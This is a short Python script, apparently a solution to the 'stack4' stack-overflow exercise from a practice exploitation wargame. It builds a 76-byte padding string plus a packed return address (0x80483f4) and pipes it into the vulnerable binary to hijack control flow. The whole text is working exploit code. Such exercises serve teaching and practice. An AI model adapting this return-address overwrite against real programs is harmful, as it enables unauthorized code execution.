#!/usr/bin/env python
import os, struct as s
a = '_'*64  # `leave` overwrite
a += '_'*12
a += s.pack('<i', 0x80483f4)
os.system('echo -n {0} | stack4'.format(a))
